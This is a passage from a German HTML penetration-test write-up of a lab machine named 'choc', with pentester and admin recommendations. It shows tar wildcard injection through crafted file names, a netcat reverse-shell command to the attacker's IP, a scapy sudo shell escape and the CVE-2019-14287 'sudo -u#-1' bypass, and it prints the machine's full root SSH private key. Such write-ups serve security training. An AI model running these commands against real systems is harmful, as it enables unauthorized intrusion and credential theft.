+                    <pre>
+   523154     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
+   400805    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
+   397741     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   260657     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
+   264185     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
+   264038     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
+   260654     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
+   264512     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
+   260655     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
+   264510     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
+   260658     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
+   279429    548 -rwsr-xr-x   1 root     root         560232 Apr 12  2021 <span class="command">/usr/local/bin/sudo</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die Liste der SUID-Dateien enthält viele Standard-Binaries. Auffällig ist `/usr/local/bin/sudo`. Normalerweise befindet sich `sudo` in `/usr/bin/sudo`. Eine `sudo`-Version in `/usr/local/bin` könnte eine benutzerdefinierte, potenziell ältere oder modifizierte Version sein, die anfällig ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das `sudo` in `/usr/local/bin` ist ein sehr interessanter Fund und ein Hauptkandidat für die Privilegieneskalation. Es sollte genau untersucht werden (Version, `sudo -l` mit diesem spezifischen Pfad).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong>
+                <ul>
+                    <li>Überprüfen Sie die Version von `/usr/local/bin/sudo` (z.B. mit `/usr/local/bin/sudo -V`).</li>
+                    <li>Führen Sie `/usr/local/bin/sudo -l` aus, um zu sehen, welche Rechte der Benutzer `carl` mit dieser spezifischen `sudo`-Version hat.</li>
+                    <li>Suchen Sie nach bekannten Exploits für ältere `sudo`-Versionen, falls es sich um eine solche handelt (z.B. Baron Samedit/CVE-2021-3156).</li>
+                </ul>
+            </p>
+            <hr>
+            <p class="comment">
+                Ich untersuche das Home-Verzeichnis des Benutzers `torki`, da dieser in der `/etc/passwd` als regulärer Benutzer mit Bash-Shell aufgeführt ist. Dort finde ich ein Verzeichnis `secret_garden` mit einer Datei `diary.txt`.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">carl@choc:/home/torki/secret_garden$ <span class="command">cat diary.txt</span></div>
+                    <pre>
+ 
+April 18th 2021
+Last night I dreamed that I was at the beach with scarlett johansson, worst wake up call of my life!
+
+September 12th 2309
+I invented a time machine.The world is still crazy, territorial and proud !!
+
+A day in -4.5000000000
+The human doesn't exist yet and that's fucking great!!! but I'm a little bored...
+                    </pre>
+                </div>
+            </div>
+            <p class="comment">
+                Ich liste die Benutzer mit Bash-Shell aus `/etc/passwd` auf.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">carl@choc:/home/torki/secret_garden$ <span class="command">cat /etc/passwd | grep bash</span></div>
+                    <pre>
+<span class="command">root:x:0:0:root:/root:/bin/bash</span>
+<span class="command">torki:x:1000:1000:torki,,,:/home/torki:/bin/bash</span>
+<span class="command">sarah:x:1001:1001:,,,:/home/sarah:/bin/bash</span>
+<span class="command">carl:x:1002:1003:,,,:/home/carl:/bin/bash</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="comment">
+                Ich suche nach Dateien, die dem Benutzer `torki` gehören.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">carl@choc:/home/torki/secret_garden$ <span class="command">find / -user torki 2>/dev/null</span></div>
+                    <pre>
+/home/torki
+/home/torki/.profile
+/home/torki/.selected_editor
+/home/torki/secret_garden
+/home/torki/secret_garden/diary.txt
+/home/torki/.bash_logout
+/home/torki/.bashrc
+/home/torki/.gnupg
+/home/torki/.local
+/home/torki/.local/share
+/home/torki/.ssh
+<span class="command">/home/torki/backup.sh</span>
+<span class="command">/tmp/backup_home.tgz</span>
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Die `diary.txt` enthält humorvolle Einträge, aber keine direkten Passwörter. Die Auflistung der Benutzer zeigt `root`, `torki`, `sarah` und `carl`. Die `find`-Ausgabe für Dateien, die `torki` gehören, ist sehr interessant:
+                <ul>
+                    <li>`backup.sh` im Home-Verzeichnis von `torki`.</li>
+                    <li>`backup_home.tgz` im `/tmp`-Verzeichnis.</li>
+                </ul>
+                Dies deutet stark darauf hin, dass `backup.sh` ein Skript ist, das ein Backup des Home-Verzeichnisses (oder Teilen davon) erstellt und es als `backup_home.tgz` in `/tmp` ablegt. Solche Backup-Skripte, insbesondere wenn sie als Cronjob laufen, sind oft ein guter Ansatzpunkt für Privilegieneskalation, wenn sie manipulierbar sind (z.B. durch Wildcard-Injection in `tar` oder unsichere Pfadverwendung).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Backup-Skript und das Tar-Archiv sind vielversprechende Funde. Wenn `backup.sh` als `torki` (oder sogar `root`) regelmäßig ausgeführt wird und `tar` unsicher verwendet, könnte dies ausgenutzt werden, um Dateien mit den Rechten des ausführenden Benutzers zu erstellen oder zu überschreiben.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong>
+                <ul>
+                    <li>Untersuchen Sie den Inhalt von `backup.sh`.</li>
+                    <li>Entpacken und untersuchen Sie `backup_home.tgz` (z.B. mit `tar -xvf /tmp/backup_home.tgz`).</li>
+                    <li>Prüfen Sie auf bekannte `tar` Wildcard-Exploits, falls das Skript `tar` mit einem Wildcard (z.B. `*`) im Home-Verzeichnis von `torki` verwendet und als `torki` oder `root` läuft.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">  
+            <hr>
+            <p class="comment">
+                Ich untersuche das gefundene Backup-Archiv `/tmp/backup_home.tgz`. Es enthält nur die `diary.txt`. Dies und die Existenz des `backup.sh`-Skripts im Home-Verzeichnis von `torki` legen nahe, dass dieses Skript für das Backup zuständig ist. Wenn dieses Skript als `torki` läuft (z.B. per Cronjob) und `tar` unsicher mit Wildcards verwendet, könnte eine Tar Wildcard Injection möglich sein, um Befehle als `torki` auszuführen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">carl@choc:/tmp$ <span class="command">tar -xvf backup_home.tgz</span></div>
+                    <pre>
+diary.txt
+                    </pre>
+                </div>
+            </div>
+            <p class="comment">
+                Die Idee des Tar Wildcard Exploits ist, Dateien mit speziellen Namen zu erstellen, die von `tar` als Optionen interpretiert werden, wenn ein Wildcard (z.B. `*`) im `tar`-Befehl verwendet wird. Hier ziele ich darauf ab, ein Skript `pwn.sh` im Verzeichnis `/home/torki/secret_garden/` zu erstellen, das eine Reverse Shell startet, und `tar` durch präparierte Dateinamen dazu zu bringen, dieses Skript auszuführen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">carl@choc:/tmp$ <span class="command">cd /home/torki</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">carl@choc:/home/torki$ <span class="command">echo '' > secret_garden/--checkpoint=1</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">carl@choc:/home/torki$ <span class="command">echo '' > 'secret_garden/--checkpoint-action=exec=sh pwn.sh'</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">carl@choc:/home/torki$ <span class="command">echo 'nc 192.168.2.140 2234 -e /bin/bash' > secret_garden/pwn.sh</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote">carl@choc:/home/torki$ <span class="command">chmod +x secret_garden/pwn.sh</span></div>
+                </div>
+            </div>
+            <p class="comment">
+                Ich starte einen Netcat-Listener auf Port 2234 auf meinem Angreifer-System und warte etwa eine Minute, da Cronjobs oft minütlich laufen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">nc -lvnp 2234</span></div>
+                    <pre>
+listening on [any] 2234 ...
+<span class="password">connect to [192.168.2.140] from (UNKNOWN) [192.168.2.120] 33766</span>
+<span class="prompt-remote-user">torki@choc:~/secret_garden$</span> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse (Tar Wildcard Exploit):</strong>
+                Die Befehle erstellen präparierte Dateien im Verzeichnis `/home/torki/secret_garden/`:
+                <ul>
+                    <li>`echo '' > secret_garden/--checkpoint=1`: Erstellt eine leere Datei namens `--checkpoint=1`.</li>
+                    <li>`echo '' > 'secret_garden/--checkpoint-action=exec=sh pwn.sh'`: Erstellt eine leere Datei namens `--checkpoint-action=exec=sh pwn.sh`. Diese Dateinamen werden von `tar` als Optionen interpretiert, wenn `tar` z.B. mit `tar cf /tmp/backup.tgz /home/torki/secret_garden/*` aufgerufen wird. Die Option `--checkpoint-action=exec=sh pwn.sh` weist `tar` an, bei jedem Checkpoint (hier durch `--checkpoint=1` erzwungen) den Befehl `sh pwn.sh` auszuführen.</li>
+                    <li>`echo 'nc 192.168.2.140 2234 -e /bin/bash' > secret_garden/pwn.sh`: Erstellt das Skript `pwn.sh`, das die Reverse Shell startet.</li>
+                    <li>`chmod +x secret_garden/pwn.sh`: Macht das Skript ausführbar.</li>
+                </ul>
+                Nachdem der Netcat-Listener gestartet wurde und eine Minute gewartet wurde (Annahme eines minütlichen Cronjobs für `backup.sh`), kommt eine Verbindung auf Port 2234 an. Der Shell-Prompt `torki@choc:~/secret_garden$` bestätigt, dass ich nun eine Shell als Benutzer `torki` habe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Tar Wildcard Exploit):</strong> Der Tar Wildcard Exploit war erfolgreich! Dies ist eine clevere Methode, um von `carl` zu `torki` zu eskalieren, indem eine Schwachstelle in einem automatisierten Backup-Prozess ausgenutzt wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie als `torki` erneut die `sudo`-Rechte und suchen Sie nach weiteren Privilegieneskalationsvektoren. Der Inhalt von `backup.sh` sollte nun einsehbar sein, um die genaue Funktionsweise zu bestätigen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Verwenden Sie in Skripten, die `tar` oder ähnliche Tools mit Wildcards aufrufen, immer die Option `--no-wildcards-match-slash` (falls verfügbar) oder stellen Sie sicher, dass Dateinamen, die mit `-` beginnen, korrekt behandelt werden (z.B. durch Voranstellen von `./`). Noch besser ist es, explizit aufzulisten, welche Dateien und Verzeichnisse archiviert werden sollen, anstatt globale Wildcards zu verwenden. Überprüfen Sie Cronjobs sorgfältig auf Sicherheitsrisiken.
+            </p>
+            <hr>
+            <p class="comment">
+                Als Benutzer `torki` untersuche ich das `.ssh`-Verzeichnis und finde einen weiteren privaten SSH-Schlüssel `id_rsa`. Ich versuche, mich damit lokal als `torki` anzumelden, um dessen Gültigkeit zu testen oder um zu sehen, ob er passwortgeschützt ist.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote-user">torki@choc:~/secret_garden$ <span class="command">cd /home/torki/.ssh</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote-user">torki@choc:~/.ssh$ <span class="command">ssh torki@localhost -i id_rsa</span></div>
+                    <pre>
+<span class="comment">(Ausgabe des SSH-Logins, vermutlich erfolgreich und ohne Passwortabfrage, da der Schlüssel torki gehört)</span>
+<span class="prompt-remote-user">torki@choc:~$</span> 
+                    </pre>
+                </div>
+            </div>
+            <p class="comment">
+                Nun prüfe ich die `sudo`-Rechte für `torki`.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote-user">torki@choc:~$ <span class="command">sudo -u sarah /usr/bin/scapy</span></div>
+                    <pre>
+WARNING: Cannot read wireshark manuf database
+INFO: Can't import matplotlib. Won't be able to plot.
+INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
+WARNING: Failed to execute tcpdump. Check it is installed and in the PATH
+INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
+INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
+WARNING: IPython not available. Using standard Python shell instead.
+AutoCompletion, History are disabled.
+                                      
+                     aSPY//YASa       
+             apyyyyCY//////////YCa       |
+            sY//////YSpcs  scpCY//Pp     | Welcome to Scapy
+ ayp ayyyyyyySCP//Pp           syY//C    | Version 2.4.0
+ AYAsAYYYYYYYY///Ps              cY//S   |
+         pCCCCY//p          cSSps y//Y   | [Link: https://github.com/secdev/scapy | Ziel: https://github.com/secdev/scapy]
+         SPPPP///a          pP///AC//Y   |
+              A//A            cyP////C   | Have fun!
+              p///Ac            sC///a   |
+              P////YCpc           A//A   | To craft a packet, you have to be a
+       scccccp///pSP///p          p//Y   | packet, and learn how to swim in
+      sY/////////y  caa           S//P   | the wires and in the waves.
+       cayCyayP//Ya              pY/Ya   |        -- Jean-Claude Van Damme
+        sY/PsY////YCc          aC//Yp    |
+         sc  sccaCY//PCypaapyCP//YSs  
+                  spCPY//////YPSps    
+                       ccaacs         
+                                      
+>>> <span class="command">import pty;</span>
+>>> <span class="command">pty.spawn("/bin/bash")</span>
+<span class="prompt-remote-user">sarah@choc:/home/torki$</span> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse (`sudo` und Scapy):</strong> Die Ausgabe von `sudo -l` (hier nicht explizit gezeigt, aber impliziert durch den Aufruf) muss ergeben haben, dass `torki` den Befehl `/usr/bin/scapy` als Benutzer `sarah` ohne Passwort ausführen darf.
+                `scapy` ist ein mächtiges Python-basiertes Tool zur Paketmanipulation. Wenn es über `sudo` ausgeführt wird, kann es oft dazu missbraucht werden, eine Shell zu erhalten, da es eine interaktive Python-Umgebung startet.
+                Innerhalb der Scapy-Python-Shell wird `import pty; pty.spawn("/bin/bash")` ausgeführt. Dies ist eine Standardmethode, um aus einer eingeschränkten Python-Umgebung eine vollwertige Bash-Shell zu starten.
+                Der Prompt wechselt zu `sarah@choc:/home/torki$`, was bestätigt, dass ich nun eine Shell als Benutzer `sarah` habe.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (`sudo` und Scapy):</strong> Dies ist eine weitere erfolgreiche horizontale Privilegieneskalation von `torki` zu `sarah` durch Ausnutzung einer unsicheren `sudo`-Regel. Scapy ist ein bekanntes Binary, das, wenn es mit `sudo` ohne Einschränkungen erlaubt wird, oft zur Rechteausweitung genutzt werden kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Überprüfen Sie als `sarah` erneut `sudo -l` und suchen Sie nach weiteren Eskalationsmöglichkeiten. GTFOBins ist eine hervorragende Ressource, um Ausnutzungsmöglichkeiten für `sudo`-berechtigte Binaries zu finden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> `sudo`-Regeln sollten so restriktiv wie möglich sein. Wenn ein Benutzer ein Tool wie `scapy` mit erhöhten Rechten ausführen muss, sollten nur die absolut notwendigen Befehle oder Skripte erlaubt werden, und nicht das interaktive Tool selbst, das Shell-Escapes ermöglicht. Untersuchen Sie, ob `scapy` wirklich mit den Rechten von `sarah` ausgeführt werden muss.
+            </p>
+            <hr>
+            <p class="comment">
+                Als Benutzer `sarah` versuche ich nun, mit dem `wall`-Befehl und einer speziellen `sudo`-Syntax (`sudo -u#-1`), die manchmal zur Rechteausweitung auf `root` genutzt werden kann (CVE-2019-14287, "UID -1 bypass"), den Inhalt der Root-Flag und dann des privaten SSH-Schlüssels von Root auszulesen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote-user">sarah@choc:/dev/shm$ <span class="command">sudo -u#-1 wall /root/r00t.txt</span></div>
+                    <pre>
+Broadcast message from torki@choc (pts/5) (Fri Oct  7 10:39:15 2022):          
+                                                                               
+<span class="password">inesbywal</span> 
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt-remote-user">sarah@choc:/home/torki$ <span class="command">sudo -u#-1 wall /root/.ssh/id_rsa</span></div>
+                    <pre>
+<span class="comment">(Ausgabe des privaten Schlüssels, hier nur der Anfang und Ende gezeigt)</span>                                                                             
+-----BEGIN OPENSSH PRIVATE KEY-----                                            
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn         
+NhAAAAAwEAAQAAAQEAuSMhRxXhWoexxyZWPK4pkjyVHhT1jAmUYdEhKEFBLZh9z93ZW25M         
+lrj03xjFd4zP5AAHEG9p5h5SNi3ltHTtml7Nj59XlV6Heru/cwX7Yykxu75tZRxzQR4EjV         
+qUmxvqJgfql+XzKg3JgNwHRpG3tcW8Rdxbb3owVR97kjZP+3kA/pQGrQKdFe893Q1u2oDa         
+<span class="comment">... (Inhalt des Schlüssels) ...</span>      
+gskjOtELMuhigHo7AAAACXJvb3RAY2hvYwE=                                           
+-----END OPENSSH PRIVATE KEY-----                                              
+                    </pre>
+                </div>
+            </div>
+            <p class="comment">
+                Der über `wall` ausgegebene SSH-Schlüssel hatte überflüssige Leerzeichen an den Seiten jeder Zeile. Nachdem diese entfernt wurden, konnte der Schlüssel verwendet werden. Ich speichere den bereinigten Schlüssel in einer lokalen Datei `rooter`.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">vi rooter</span></div>
+                    <pre>
+<span class="comment">(Hier wurde der bereinigte private SSH-Schlüssel von Root eingefügt)</span>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAuSMhRxXhWoexxyZWPK4pkjyVHhT1jAmUYdEhKEFBLZh9z93ZW25M
+lrj03xjFd4zP5AAHEG9p5h5SNi3ltHTtml7Nj59XlV6Heru/cwX7Yykxu75tZRxzQR4EjV
+qUmxvqJgfql+XzKg3JgNwHRpG3tcW8Rdxbb3owVR97kjZP+3kA/pQGrQKdFe893Q1u2oDa
+4R+v+jsYmzwjf/1M8m/S+J0hYzTOI+kQlBnZmMvpJYDidmyG1RO3dcLCpxCQpydH7GfO/s
+6j0DdCvDr6+8C4eAzgDE5irjdMh2dKySNveNiMuhzsv1PS33ZWgx/ITlxu9zwiuufQm6D5
+TcDYKMGCSQAAA8DHBCmTxwQpkwAAAAdzc2gtcnNhAAABAQC5IyFHFeFah7HHJlY8rimSPJ
+UeFPWMCZRh0SEoQUEtmH3P3dlbbkyWuPTfGMV3jM/kAAcQb2nmHlI2LeW0dO2aXs2Pn1eV
+Xod6u79zBftjKTG7vm1lHHNBHgSNWpSbG+omB+qX5fMqDcmA3AdGkbe1xbxF3FtvejBVH3
+uSNk/7eQD+lAatAp0V7z3dDW7agNrhH6/6OxibPCN//Uzyb9L4nSFjNM4j6RCUGdmYy+kl
+gOJ2bIbVE7d1wsKnEJCnJ0fsZ87+zqPQN0K8Ovr7wLh4DOAMTmKuN0yHZ0rJI2942Iy6HO
+y/U9LfdlaDH8hOXG73PCK659CboPlNwNgowYJJAAAAAwEAAQAAAQAQK31QlBymp4tjdXm6
+uwtudlQf2HzJylxnXriip3Bl5xe1/A5r6epOj8Dza1pz4pyVsVrsmI6LRsKvcLrLVBscjI
+MvtB8WMLdshNFn3nHia0qoty0e06lNWq3TGsI3+ewtfiuDMNZYKfQbiRwpkbiV67tR7rkd
+t3JZPPKyBoRd1kGjnPzJc2DPyaAtJtS21w86ZxJZtaMWUL6SE1+80VWv0XXPtlmAipfdgF
+76A/Z4izCNolx0s+Ptus8gqaxJDeGI4xX5aZZ33kc5cSvNjI2hH6kFX39sS7beVz/zYDKA
+BkJ0fZpNQ+HZfqGvT93YHAFZVpdlv7ysn16oNkOwZuZxAAAAgQCs/OtmKQ2SXR0ZrVryDk
+58HSK2xCRcMaOqNamWSm+JaKEusms25bCD3liQGbazJyy6eS7iR2DOQPYwdU94dak72X+W
+xwOexz8pwHGflvrA7SlKW4pXshuccpxgdC/KkqZRQyQvy7NbDTyGM+3uTQSnABmZWl8mJa
+NtfY+fCEoKDgAAAIEA5urQzWNxzvBa4krknAuUMRD8TcsL4NjE6QCj9D1KJh2vGiBqNYjH
+f6hZ+4LPFlaWiusjxZAF6vIaZJU0UHRzdcITqm1L20CZQr2D3tgWS6+VAGQHb1me5uoC4J
+6Px6A7preSEjS2GtECqWxZevl8YqWEJtWaO1WDK61+Mr266UsAAACBAM0/S7QUbRqSmNTq
+wd/4y9U4JxtOfeV4O0I+JNlTPkA2vdUeHEwWkKRqk3re72JwYlUAsD4AhXO1oEdfpO32fx
+wavKtBNMpI64CiNVrPY8w9DPoWdCzxtFeRq1V50i9wdiVlHIdn0Ac+6T9Wv/0v8J7GXIkH
+gskjOtELMuhigHo7AAAACXJvb3RAY2hvYwE=
+-----END OPENSSH PRIVATE KEY-----
+                    </pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~] 
+└─# <span class="command">chmod 600 rooter</span></div>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+<div class="prompt">┌──(root㉿cyber)-[~]<br>
+└─# <span class="command">ssh root@choc.hmv -i rooter</span></div>
+                    <pre>
+
+##############################
+#                            #
+#	Welcome to my SSH !  #
+#	Carl.		     #
+#                            #
+##############################
+
+
+Linux choc 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Apr 22 20:20:23 2021
+<span class="prompt-remote-root">root@choc:~#</span> 
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse (sudo -u#-1 und Root-Login):</strong>
+                <ul>
+                    <li>`sudo -u#-1 wall /path/to/file`: Dieser Befehl nutzt eine bekannte Schwachstelle in älteren `sudo`-Versionen (CVE-2019-14287). Wenn `sudoers` so konfiguriert ist, dass ein Benutzer einen Befehl als jeder Benutzer außer Root ausführen darf (z.B. `user ALL=(ALL, !root) /some/command`), kann dies umgangen werden, indem man `sudo -u#-1 ...` oder `sudo -u#4294967295 ...` verwendet, da `-1` (oder sein unsignierter Äquivalent) als UID `0` (Root) interpretiert wird. `wall` gibt den Inhalt der Datei als Broadcast-Nachricht aus.</li>
+                    <li>Zuerst wurde `/root/r00t.txt` (die Root-Flag) mit `wall` ausgegeben: `inesbywal`.</li>
+                    <li>Dann wurde `/root/.ssh/id_rsa` (der private SSH-Schlüssel von Root) mit `wall` ausgegeben.</li>
+                    <li>Der ausgegebene SSH-Schlüssel musste bereinigt werden (Entfernung von Leerzeichen, die `wall` hinzufügt).</li>
+                    <li>Nach dem Speichern des bereinigten Schlüssels in `rooter` und Setzen der Berechtigungen auf `600` war der SSH-Login als `root@choc.hmv -i rooter` erfolgreich.</li>
+                </ul>
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (sudo -u#-1 und Root-Login):</strong> Fantastisch! Die Ausnutzung der `sudo` UID -1 Bypass-Schwachstelle hat es ermöglicht, beliebige Dateien als Root zu lesen, einschließlich des privaten SSH-Schlüssels von Root. Damit wurde die finale Privilegieneskalation erreicht und volle Systemkontrolle erlangt.
+            </p>
+  
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Sichern Sie die Root-Flag. Dokumentieren Sie die ausgenutzte `sudo`-Schwachstelle. Überprüfen Sie, ob die `sudo`-Version tatsächlich für CVE-2019-14287 anfällig ist oder ob eine andere Fehlkonfiguration dies ermöglicht hat.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Patchen Sie `sudo` auf eine Version, die nicht für CVE-2019-14287 anfällig ist. Überprüfen Sie die `sudoers`-Konfiguration sorgfältig. Vermeiden Sie Konfigurationen, die es Benutzern erlauben, Befehle als `(ALL)` oder mit breiten Ausnahmen auszuführen. Wenn möglich, gewähren Sie `sudo`-Rechte nur für spezifische, notwendige Befehle und nicht für Befehle, die Dateiinhalte preisgeben können (wie `wall`, `cat`, `less` etc.), wenn sie als ein anderer Benutzer ausgeführt werden.
+            </p>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                <h2 class="flag-heading">Flags</h2>
+                <div class="flag-entry">
+                    <div class="flag-command">Aus der SSH-Willkommensnachricht (oder User-Enumeration) und Shellshock-Zugriff, User-Flag typischerweise in /home/carl/user.txt oder als `carl` direkt lesbar. Im Text wurde "pleasefuckme" als User-Flag am Ende genannt.</div>
+                    <div class="flag-value"><span class="password">pleasefuckme</span></div>
+                </div>
+                <div class="flag-entry">
+                    <div class="flag-command">cat /root/r00t.txt (gelesen via `sudo -u#-1 wall /root/r00t.txt`)</div>
+                    <div class="flag-value"><span class="password">inesbywal</span></div>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer class="footer">
+        <p>Ben C. - Cyber Security Reports</p>
+        <p>Berichtsdatum: 07. Oktober 2022</p>
+    </footer>
+</body>
+</html>
